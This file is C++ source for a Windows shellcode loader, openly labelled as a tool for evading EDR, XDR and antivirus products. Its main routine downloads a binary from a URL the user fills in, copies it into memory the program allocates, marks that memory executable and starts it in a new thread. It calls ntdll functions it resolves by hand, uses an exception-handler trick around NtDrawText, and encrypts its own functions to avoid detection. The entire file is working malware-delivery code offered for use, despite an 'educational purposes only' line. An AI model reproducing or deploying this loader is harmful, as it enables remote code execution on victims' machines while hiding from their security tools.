//       --------------------------------------------------
//       │ Author     : Evilbytecode                      │
//       │ Name       : Evilbytecode-EDR/XDR/AV-SHC-LOADER│
//       │ Contact    : https://github.com/Evilbytecode   │
//       --------------------------------------------------
//       This program is distributed for educational purposes only.

#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <cstdlib>
#include <wininet.h>
#include "peb.h"
#include "custom_getmodulehandlea.h"
#include "SED.h"
#pragma comment(lib, "wininet.lib")


using namespace std;

std::map<PVOID, string> Nt_Table;
DWORD t = 0;
LPVOID m_Index;

typedef DWORD(WINAPI* pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef DWORD(WINAPI* NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef DWORD(WINAPI* NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PDWORD);

PVOID VxMoveMemory(PVOID, const PVOID, SIZE_T);
LONG WINAPI VectExceptionHandler(PEXCEPTION_POINTERS);
__declspec(noinline) void EncryptShellcode(std::vector<BYTE>&);
__declspec(noinline) std::vector<BYTE> DownloadBinary(const wchar_t*);
FARPROC GetFuncCall(HMODULE, LPCSTR);
__declspec(noinline) void* ExecuteShellcode(std::vector<BYTE>*);
extern "C" VOID hello();

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
    char* d = (char*)dest;
    const char* s = (const char*)src;
    while (len--) *d++ = *s++;
    return dest;
}

LONG WINAPI VectExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        pExceptionInfo->ContextRecord->R10 = pExceptionInfo->ContextRecord->Rcx;
        hello();
        pExceptionInfo->ContextRecord->Rax = t;
        hello();
        pExceptionInfo->ContextRecord->Rip = (DWORD64)((DWORD64)m_Index + 0x12);
        hello();
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

__declspec(noinline) void EncryptShellcode(std::vector<BYTE>& shellcode) {
    EncryptFunction((uintptr_t)&shellcode[0]);
    EndSED((void*)(0));
}

__declspec(noinline) std::vector<BYTE> DownloadBinary(const wchar_t* url) {
    HINTERNET hInternet = InternetOpenW(L"CodepulzeIsPapa", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return {};

    HINTERNET hFile = InternetOpenUrlW(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return {};
    }

    std::vector<BYTE> buffer;
    BYTE tempBuffer[1024];
    DWORD bytesRead;

    while (InternetReadFile(hFile, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead) {
        buffer.insert(buffer.end(), tempBuffer, tempBuffer + bytesRead);
    }
    EncryptShellcode(buffer);
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    return buffer;
}

FARPROC GetFuncCall(HMODULE hModule, LPCSTR lpProcName) {
    DWORD_PTR baseAddress = reinterpret_cast<DWORD_PTR>(hModule);
    PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    PIMAGE_NT_HEADERS64 ntHeader = reinterpret_cast<PIMAGE_NT_HEADERS64>(baseAddress + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    PIMAGE_EXPORT_DIRECTORY exportDirectory = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(baseAddress + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names = reinterpret_cast<DWORD*>(baseAddress + exportDirectory->AddressOfNames);
    WORD* ordinals = reinterpret_cast<WORD*>(baseAddress + exportDirectory->AddressOfNameOrdinals);
    DWORD* functions = reinterpret_cast<DWORD*>(baseAddress + exportDirectory->AddressOfFunctions);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
        LPCSTR functionName = reinterpret_cast<LPCSTR>(baseAddress + names[i]);
        if (strcmp(lpProcName, functionName) == 0) {
            WORD ordinal = ordinals[i];
            DWORD functionAddress = functions[ordinal];
            return reinterpret_cast<FARPROC>(baseAddress + functionAddress);
        }
    }
    return nullptr;
}

__declspec(noinline) void* ExecuteShellcode(std::vector<BYTE>* shellcode) {
    HANDLE hProcess = GetCurrentProcess();
    HANDLE hThread = NULL;
    PVOID lpAddress = NULL;
    SIZE_T sDataSize = shellcode->size();
    DWORD ulOldProtect;

    FARPROC pNtAllocateVirtualMemory = GetFuncCall(GetModuleCall(L"Ntdll.dll"), "NtAllocateVirtualMemory");
    FARPROC pNtProtectVirtualMemory = GetFuncCall(GetModuleCall(L"Ntdll.dll"), "NtProtectVirtualMemory");
    FARPROC pNtCreateThreadExFunc = GetFuncCall(GetModuleCall(L"Ntdll.dll"), "NtCreateThreadEx");

    if (pNtAllocateVirtualMemory) {
        reinterpret_cast<NtAllocateVirtualMemory>(pNtAllocateVirtualMemory)((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
    }

    VxMoveMemory(lpAddress, shellcode->data(), shellcode->size());

    if (pNtProtectVirtualMemory) {
        reinterpret_cast<NtProtectVirtualMemory>(pNtProtectVirtualMemory)((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);
    }

    if (pNtCreateThreadExFunc) {
        reinterpret_cast<pNtCreateThreadEx>(pNtCreateThreadExFunc)(&hThread, PROCESS_ALL_ACCESS, NULL, hProcess, lpAddress, NULL, 0, 0, 0, 0, NULL);
    }

    return EndSED((void*)(0));
}

int main() {
    m_Index = (LPVOID)GetFuncCall(GetModuleCall(L"Ntdll.dll"), "NtDrawText");
    AddVectoredExceptionHandler(1, VectExceptionHandler);

    std::wstring url = L"YOUR LINK HERE";
    EncryptFunction((uintptr_t)&DownloadBinary);

    std::vector<BYTE>* shellcode = (std::vector<BYTE>*)CallFunction((void*)&DownloadBinary, url.c_str());
    if (shellcode == nullptr || shellcode->empty()) return 1;

    ExecuteShellcode(shellcode);
    return 0;
}
